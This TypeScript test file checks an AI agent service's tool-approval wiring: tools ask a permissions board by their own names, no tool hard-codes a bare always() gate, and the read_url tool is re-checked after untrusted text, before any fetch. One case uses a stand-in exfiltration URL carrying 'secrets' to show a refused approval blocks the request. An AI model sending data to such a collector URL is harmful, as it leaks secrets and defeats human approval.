// Every gated tool asks the permissions board, by its own name; every always-ask tool this service
// ships carries the check. A bare `approval: always()` would ignore the board forever.
//
// W7A-s2 widened the ban past this service's own two directories: the kit's note-write factories
// carried exactly that bare `always()`, and nothing here could see it.
import { readdirSync, readFileSync } from "node:fs";
import { basename, dirname, join } from "node:path";
import { fileURLToPath } from "node:url";
import { mustAlwaysAsk, TOOL_CATEGORIES } from "@lares/agent-kit/always-ask";
import { afterEach, describe, expect, it, vi } from "vitest";

// BOTH directories, since ORB-278 step 2 (ADR-0015 rule 3, Task 9): Saga's real tools live in the
// `catalogue/` pool now, and what is left under agent/tools/ is the eight `disableTool()`
// sentinels, the one skill-gated tool (commercial_who_to_contact) and the one resolver. Reading
// only agent/tools/ would have left every moved tool unchecked and every assertion below
// vacuously green.
//
// `catalogue.ts` itself is excluded the same way `index.ts` already is: it is the resolver, not a
// tool, and carries no approval of its own — its header comment quotes the literal string
// `approval: always()` in prose (describing the three vault tools whose approval it copies
// across), which is not code and must not trip the bare-`always()` scan below.
const here = dirname(fileURLToPath(import.meta.url));
const DIRS = [join(here, "../agent/tools"), join(here, "../catalogue")];
const paths = new Map<string, string>();
for (const dir of DIRS) {
  for (const f of readdirSync(dir).filter((n) => n.endsWith(".ts") && n !== "index.ts" && n !== "catalogue.ts")) {
    paths.set(f, join(dir, f));
  }
}
const files = [...paths.keys()].sort();
const src = (f: string) => readFileSync(paths.get(f)!, "utf8");
// meeting_followup_send keeps its own series-level check (ORB-156) — board-controlled contact.
// meeting_followup_auto is NOT here: it always asks (it changes Saga's own autonomy — owner decision,
// final review O1), so the check below holds it to carrying approvalFor like any always-ask tool.
//
// W7D-s3: `read_url` joins it. Its policy is not the board's at all — it is the in-turn taint
// (`asksAfterUntrustedText`), which asks only after the turn has already read somebody else's
// words. There is no capability dial that could express "ask only then", so this one is decided
// per call from the turn's own history rather than from a row.
const OWN_POLICY = new Set(["meeting_followup_send.ts", "read_url.ts"]);

describe("board wiring", () => {
  it("no tool carries a bare always() any more", () => {
    expect(files.filter((f) => /approval:\s*always\(\)/.test(src(f)))).toEqual([]);
  });
  it("each approvalFor names its own tool", () => {
    const wrong = files.filter((f) => {
      const m = /approvalFor\("([^"]+)"\)/.exec(src(f));
      return m && m[1] !== basename(f, ".ts");
    });
    expect(wrong).toEqual([]);
  });
  it("every always-ask tool here carries the check", () => {
    const missing = files
      .filter((f) => !OWN_POLICY.has(f) && !/disableTool/.test(src(f)))
      .map((f) => basename(f, ".ts"))
      .filter((t) => TOOL_CATEGORIES[t] !== undefined && mustAlwaysAsk(t).ask)
      .filter((t) => !src(`${t}.ts`).includes(`approvalFor("${t}")`));
    expect(missing).toEqual([]);
  });
  it("the kit's three vault writes are on the board like every other gated tool", () => {
    for (const t of ["agent-kit__vault_write", "agent-kit__vault_file", "agent-kit__vault_drop"]) {
      expect(src(`${t}.ts`), t).toContain(`approvalFor("${t}")`);
    }
  });
  it("and the kit's own factories no longer hard-code always() either", () => {
    // W7A-s2: the scan above reads only THIS service's two directories, so for years the one
    // `approval: always()` that mattered most — the three note writes' — sat outside it, in
    // `packages/agent-kit/extension/lib/note-write-tools.ts`, unseen by the ban. The factory is
    // read here by path so deleting the injection point, or re-hard-coding the gate, fails.
    const factories = readFileSync(join(here, "..", "..", "..", "packages", "agent-kit", "extension", "lib", "note-write-tools.ts"), "utf8");
    expect(/approval:\s*always\(\)/.test(factories)).toBe(false);
    expect(factories).toContain("approval: (deps?.approval ?? always()) as never,");
  });
  it("switching a meeting series to auto-send always asks, through the board's check", () => {
    expect(mustAlwaysAsk("meeting_followup_auto")).toEqual({ ask: true, reason: "changing its own autonomy always asks first" });
    expect(src("meeting_followup_auto.ts")).toContain('approvalFor("meeting_followup_auto")');
  });

  // W7A-s6 — the approver re-check is not the whole story any more: every tool that calls
  // `assertApprover` also has to check WHICH card it answered, or a stale/changed call would
  // slip through on an approver check alone.
  it("every tool that re-checks the approver also checks the card it answered", () => {
    const behind = files
      .filter((f) => /assertApprover\(/.test(src(f)))
      .filter((f) => !/await assertApproval\(ctx, "/.test(src(f)));
    expect(behind).toEqual([]);
  });

  // W7D-s3 — the one tool whose gate is the TURN, not the board.
  //
  // Two things are pinned because both fail silently and in the fail-OPEN direction. A policy
  // that stopped being a FUNCTION would be called as one by `agent/tools/catalogue.ts`'s durable
  // re-stamp (`(valueOf(name).approval as (...a) => unknown)(...args)`) and drop the whole
  // resolver result — the 4/2/3-tools incident. And a `read_url` that lost the policy altogether
  // would simply stop asking, with every test in this repo still green.
  it("read_url asks after untrusted text, through a policy that is a function", () => {
    const text = src("read_url.ts");
    expect(text).toContain("asksAfterUntrustedText");
    expect(text).toMatch(/approval:\s*asksAfterUntrustedText\(\)/);
    expect(/approval:\s*\{/.test(text)).toBe(false);
  });

  // It is not on the board, so it carries neither `approvalFor` nor a bare `always()`: an
  // `approvalFor("read_url")` here would make an ordinary, untainted "read this link" ask on
  // every call (owner decision D1 says it must not).
  it("read_url is not on the board and does not ask on an ordinary turn", () => {
    expect(src("read_url.ts")).not.toContain("approvalFor(");
  });

  it("the check names the tool's own file", () => {
    const wrong = files.filter((f) => {
      const m = /await assertApproval\(ctx, "([^"]+)"/.exec(src(f));
      return m !== null && m[1] !== basename(f, ".ts");
    });
    expect(wrong).toEqual([]);
  });
});

// W7D-s3 — the OTHER half of the gate, at execute time.
//
// The policy decides whether a card is raised; `assertApproval` decides whether the call that
// comes back off one is the call the card showed (W7A-s6). For `read_url` those two are not the
// same population: most of its calls never park at all. Both paths are driven here against the
// real tool, because both fail silently — an unconditional check would refuse ordinary reads in
// a session nobody tapped anything in, and a missing one would let a changed or stale approved
// call through. `vi.doMock` registrations persist for the file, so each case unmocks its own.
describe("read_url's card, where there is one, is re-checked before the fetch", () => {
  const ctx = { session: { id: "s1", turn: { id: "t1" } } } as never;

  afterEach(() => {
    vi.doUnmock("@lares/agent-kit/approval-ledger");
    vi.doUnmock("../lib/approvals.js");
    vi.doUnmock("@lares/agent-kit/readability-client");
    vi.resetModules();
  });

  const wire = (opts: { row: unknown; onCheck?: () => void }) => {
    const fetched: string[] = [];
    const checked: unknown[][] = [];
    vi.doMock("@lares/agent-kit/approval-ledger", () => ({
      approvalLedger: () => ({ ask: async () => opts.row }),
      callIdFrom: () => "call-1",
    }));
    vi.doMock("../lib/approvals.js", () => ({
      assertApproval: async (...args: unknown[]) => {
        checked.push(args);
        opts.onCheck?.();
      },
    }));
    vi.doMock("@lares/agent-kit/readability-client", () => ({
      readUrl: async (url: string) => {
        fetched.push(url);
        return { title: "t", text: "x" };
      },
      readUrlModelOutput: (r: unknown) => r,
    }));
    return { fetched, checked };
  };

  const readUrlTool = async () => (await import("../catalogue/read_url.js")).default;

  it("with NO card there is no row, nothing is re-checked, and the read happens as before", async () => {
    const { fetched, checked } = wire({ row: null });
    await (await readUrlTool()).execute({ url: "https://example.test/a" }, ctx);
    expect(checked).toEqual([]);
    expect(fetched).toEqual(["https://example.test/a"]);
  });

  it("with a card, the check runs on the tool's own name and its RAW input, before the fetch", async () => {
    const { fetched, checked } = wire({ row: { requestId: "r1" } });
    await (await readUrlTool()).execute({ url: "https://example.test/a" }, ctx);
    expect(checked).toHaveLength(1);
    expect(checked[0]?.[1]).toBe("read_url");
    expect(checked[0]?.[2]).toEqual({ url: "https://example.test/a" });
    expect(fetched).toEqual(["https://example.test/a"]);
  });

  it("a refused card stops the fetch — the check is before the request, not after it", async () => {
    const { fetched } = wire({
      row: { requestId: "r1" },
      onCheck: () => {
        throw new Error("approval refused: not what the card showed");
      },
    });
    const tool = await readUrlTool();
    await expect(tool.execute({ url: "https://collector.example/?d=secrets" }, ctx)).rejects.toThrow(
      "not what the card showed",
    );
    expect(fetched).toEqual([]);
  });

  it("an unreadable ledger reads as 'no card' and never fails the read", async () => {
    const fetched: string[] = [];
    vi.doMock("@lares/agent-kit/approval-ledger", () => ({
      approvalLedger: () => {
        throw new Error("DATABASE_URL is not set");
      },
      callIdFrom: () => "call-1",
    }));
    vi.doMock("@lares/agent-kit/readability-client", () => ({
      readUrl: async (url: string) => {
        fetched.push(url);
        return { title: "t", text: "x" };
      },
      readUrlModelOutput: (r: unknown) => r,
    }));
    await (await readUrlTool()).execute({ url: "https://example.test/a" }, ctx);
    expect(fetched).toEqual(["https://example.test/a"]);
  });
});
